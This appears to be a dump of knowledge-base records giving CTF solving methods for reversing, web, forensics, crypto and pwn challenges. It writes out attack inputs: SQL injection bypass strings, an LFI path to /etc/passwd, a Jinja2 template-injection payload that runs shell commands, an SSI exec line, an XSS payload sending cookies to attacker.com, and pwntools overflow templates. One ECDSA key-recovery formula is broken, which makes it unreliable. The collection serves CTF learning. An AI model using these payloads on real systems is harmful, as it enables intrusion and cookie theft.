documents.title: Static Analysis of Compiled Binaries
documents.content: For reverse engineering challenges, start with static analysis. Use 'file' to determine binary type, 'strings' to extract hardcoded strings (flags are often just obfuscated strings). Use 'ltrace' and 'strace' to trace library/system calls. Ghidra and radare2 provide decompilation and disassembly. Look for strcmp, memcmp, and similar functions that compare input to expected values. Use 'objdump -d' for disassembly. Check for XOR-encoded strings by looking for loops with XOR operations.

documents.title: Baby Reverse Engineering Patterns
documents.content: Baby/intro reversal challenges commonly hide flags in: (1) Plaintext strings extractable via 'strings' command, (2) XOR-encoded with single byte key - try all 256 XOR values on suspicious byte arrays, (3) Caesar cipher or rot-N encoding, (4) Base64 encoded strings. For ELF binaries, run './binary' and observe output, then try 'strings binary | grep ctf'. Check .rodata section with 'objdump -s -j .rodata binary'. Often the flag is passed to puts() or printf() - trace with ltrace. Also check with gdb: set breakpoint at main, step through, print string arguments.

documents.title: Dynamic Analysis and Debugging
documents.content: Use GDB for dynamic analysis: 'gdb ./binary', 'b main', 'run'. Use pwndbg or peda plugins for enhanced GDB. Useful commands: 'info functions' to list functions, 'disas <function>' to disassemble, 'x/s <addr>' to print strings. For patched jump conditions, modify ZF with 'set $eflags'. Use 'angr' for symbolic execution to find satisfying inputs. For Go/Rust binaries, symbols may still be present. For stripped binaries, focus on main() and function cross-references. radare2's 'aa' then 'pdf @main' gives analysis.

documents.title: SQL Injection Techniques
documents.content: Test for SQL injection with single quote ' and observe errors. Classic payloads: ' OR '1'='1, ' OR 1=1--, admin'--. Use UNION-based injection to extract data: ' UNION SELECT 1,2,3--. Use sqlmap for automated testing: 'sqlmap -u URL --dbs'. Blind SQL injection: use time-based with SLEEP() or boolean-based with AND 1=1. For login bypass: username admin'-- with any password. Check for second-order injection where stored data is used in queries without sanitization. Error-based extraction uses functions like extractvalue().

documents.title: Web Application Fingerprinting and Enumeration
documents.content: For web challenges: (1) Check page source for comments, hidden fields, JS files. (2) Look for robots.txt, .git directory disclosure, backup files like .bak or ~. (3) Use curl with verbose flag to see response headers (server version, X-Powered-By). (4) Test for LFI with ../../../etc/passwd. (5) Check cookies for base64-encoded data or JWT tokens. (6) Test for SSTI with {{7*7}} in input fields. (7) Directory enumeration with gobuster or dirb. (8) Look for path traversal in file download endpoints. JWT attacks: change alg to none or RS256 to HS256.

documents.title: Web Exploitation - SSTI, XSS, and CSRF
documents.content: Server-Side Template Injection (SSTI): test with {{7*7}}, ${7*7}, <%= 7*7 %>. For Jinja2 RCE: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}. For Twig: {{_self.env.registerUndefinedFilterCallback('exec')}}. XSS: <script>document.location='http://attacker.com/?c='+document.cookie</script>. File upload bypass: change Content-Type header, use null bytes in filename, double extensions (.php.jpg). PHP-specific: test for type juggling with '0e' prefixes in MD5 comparisons. Object deserialization vulnerabilities in PHP/Java.

documents.title: ShreeRamQuest Style Web Challenges
documents.content: For quest-style web challenges involving multiple stages: (1) Follow redirects carefully with 'curl -L'. (2) Check query parameters for injection points. (3) Look for PHP include() vulnerabilities with user-controlled parameters - test with php://filter base64 wrappers. (4) Check for command injection in ping/host fields. (5) Look for file write-then-eval patterns. (6) Often involves chaining multiple small vulnerabilities. (7) Check for .htaccess misconfigurations. (8) Server-side includes (SSI) injection: <!--#exec cmd='id' -->. Check for GraphQL introspection at /graphql.

documents.title: Forensics - File Analysis and Hidden Data
documents.content: For forensics challenges: (1) Use 'file' command to identify type. (2) Use 'binwalk -e' to extract embedded files. (3) Check metadata with 'exiftool'. (4) Look for steganography: steghide, zsteg (PNG), stegsolve. (5) For images, check LSB steganography with 'zsteg image.png'. (6) Analyze network captures with Wireshark: filter by protocol, follow TCP streams, export HTTP objects. (7) For memory dumps, use Volatility framework. (8) Disk images: mount with 'mount -o loop disk.img /mnt' or use Autopsy. (9) Use 'strings' and 'grep' on raw files.

documents.title: QR Code and Image Analysis in Forensics
documents.content: For image-based forensics: (1) Try reading QR codes with 'zbarimg' or online decoders. (2) For corrupted PNG, check/fix magic bytes: 89 50 4E 47. (3) Use stegsolve to analyze color planes. (4) For black-and-white encoded data, convert binary sequences to ASCII. (5) If numbers represent pixel rows, reconstruct the image with PIL/Pillow: create image from binary data, each row being a binary number. (6) For 1black0white style: each decimal number is a row of pixels in binary form. Convert: bin(num).zfill(31) gives 31-pixel row. Use PIL.Image to recreate and scan QR code.

documents.title: Network Forensics with Wireshark/pcap
documents.content: For pcap analysis: (1) Open in Wireshark, check Statistics > Protocol Hierarchy. (2) Filter HTTP traffic: 'http', then File > Export HTTP Objects to get files. (3) Follow TCP streams: right-click > Follow > TCP Stream. (4) For DNS exfiltration, filter 'dns' and look for unusual subdomains. (5) Use tshark for command-line analysis: 'tshark -r file.pcap -Y http -T fields -e http.request.uri'. (6) USB captures: filter 'usb.data_len > 0', decode HID keyboard data. (7) For HTTP credentials, look in Authorization header or POST body. (8) Decrypt TLS if RSA key provided.

documents.title: Classical and RSA Cryptography
documents.content: For RSA challenges: (1) Small e attacks: if e=3 and message is small, m = cube_root(ciphertext). (2) Common modulus attack if same message encrypted with different keys. (3) Wiener's attack for small d: use continued fractions. (4) Factor n if vulnerable: use factordb.com or Fermat's method for close primes. (5) For classical ciphers, use frequency analysis. Vigenere uses Index of Coincidence. (6) For AES challenges: CBC bit-flipping, padding oracle attacks. (7) For hash challenges: use hashcat or john with wordlists. (8) Sage math for ECC and group theory computations.

documents.title: Elliptic Curve Cryptography Attacks
documents.content: For ECC (elliptic curve) challenges: (1) Check curve parameters for weaknesses - invalid curve attacks if not validating input. (2) Pohlig-Hellman if group order is smooth (small prime factors). (3) MOV attack: maps DLP to finite field. (4) Smart's attack if #E(Fp) = p (anomalous curve). (5) For ECDSA: if nonce k is reused or predictable, recover private key with d = (s1-s2)^{-1}*(r1*??) (6) For super_curve: likely involves solving discrete log in a small subgroup. Check if curve order factors nicely. Use sage: E = EllipticCurve(GF(p), [a,b]); E.order(); factor(). (7) Baby-step giant-step or Pollard's rho for small subgroups.

documents.title: ECC Pohlig-Hellman and Discrete Log in Python/Sage
documents.content: To solve ECDLP with Sage for CTF: E = EllipticCurve(GF(p), [a, b]); n = E.order(); factor(n). If n has small prime factors, use Pohlig-Hellman. For each prime factor q: DLP in subgroup of order q, then CRT. Sage code: from sage.groups.generic import discrete_log; k = discrete_log(target_point, base_point, ord=n, operation='+') -- uses BSGS/Pollard. For ECDSA nonce reuse: given (r,s1,m1) and (r,s2,m2): k=(m1-m2)*(s1-s2)^{-1} mod n, then d=(s*k-m)*r^{-1} mod n. Install sage: apt-get install sagemath. Run sage scripts: sage script.sage or sage -python script.py.

documents.title: Buffer Overflow - Stack-based Exploits
documents.content: For buffer overflow (pwn) challenges: (1) Identify overflow with cyclic pattern: 'cyclic 200' then check offset at crash. (2) Check security: 'checksec binary' - no NX means shellcode injection possible. (3) With NX but no ASLR: ret2libc attack, find system() and /bin/sh address. (4) With ASLR: ret2plt to leak libc address, then calculate offsets. (5) Stack canary bypass: if canary can be leaked via format string, overwrite after leak. (6) Return Oriented Programming (ROP): look for gadgets with ROPgadget or ropper. (7) pwntools template: from pwn import *; p=process('./binary'); payload=b'A'*offset+p64(ret_addr); p.sendline(payload).

documents.title: Bigboy Style Pwn - Simple BOF Challenges
documents.content: For bigboy/simple pwn challenges: (1) Usually straightforward stack overflow with no protections. (2) Run checksec: often no PIE, no stack canary, maybe NX off. (3) Find overflow offset with 'python3 -c print("A"*200)' or pwntools cyclic. (4) Common pattern: overflow to control return address or overwrite a local variable check. (5) If there's a win() function, redirect execution there. (6) For 32-bit: use p32() in pwntools, for 64-bit p64(). (7) Sample: from pwn import *; p=process('./bigboy'); payload=cyclic(64)+p64(win_addr); p.sendline(payload); p.interactive(). (8) Check for format string vulnerabilities too: %x %x %x to leak stack. For nc challenges: p=remote('host', port).

documents.title: Heap Exploitation and Format String Attacks
documents.content: Format string attacks: arbitrary read with %n$s (n=position), arbitrary write with %n$n. To find offset: send 'AAAA%x.%x.%x...' and look for 41414141. Heap exploitation: use after free, double free, heap overflow. Tools: pwndbg heap command shows heap layout. For malloc/free hooks: overwrite __malloc_hook with one_gadget address. One gadgets: 'one_gadget libc.so'. For libc leaks: use puts(got[puts]) to leak address, calculate libc base = leak - offset. Common gadgets: ret gadget for alignment, pop rdi; ret for first argument.

documents.title: CTF General Methodology
documents.content: General CTF solving methodology: (1) Read challenge description carefully, note file types given. (2) Identify category: rev=binary analysis, web=website exploitation, for=forensics/hidden data, cry=math/encryption, pwn=memory corruption. (3) Start broad: strings, file, binwalk on files. (4) Search for flag format: grep -r 'ctf{' or grep -r 'flag{'. (5) If stuck, try common tools for the category. (6) For network challenges, run tcpdump or analyze given pcap. (7) Check for encoding: base64, hex, rot13 on suspicious strings. (8) Use CyberChef for multi-layer decoding. (9) Flag format is usually stated in challenge description.

documents.title: Common CTF Tools Reference
documents.content: Essential CTF tools by category: REV: strings, file, objdump, radare2, ghidra, gdb, ltrace, strace, angr. WEB: curl, burp suite, sqlmap, nikto, gobuster, wfuzz, jwt_tool. FOR: binwalk, exiftool, steghide, zsteg, stegsolve, volatility, wireshark/tshark, foremost. CRY: sage, openssl, hashcat, john, rsatool, factordb. PWN: pwntools, gdb+pwndbg, checksec, ROPgadget, one_gadget. ALL: python3, CyberChef, gzip/zip/tar for archives. Docker environment has: gmpy2, sagemath, pwntools, radare2, gdb, sqlmap, nikto, sleuthkit pre-installed.
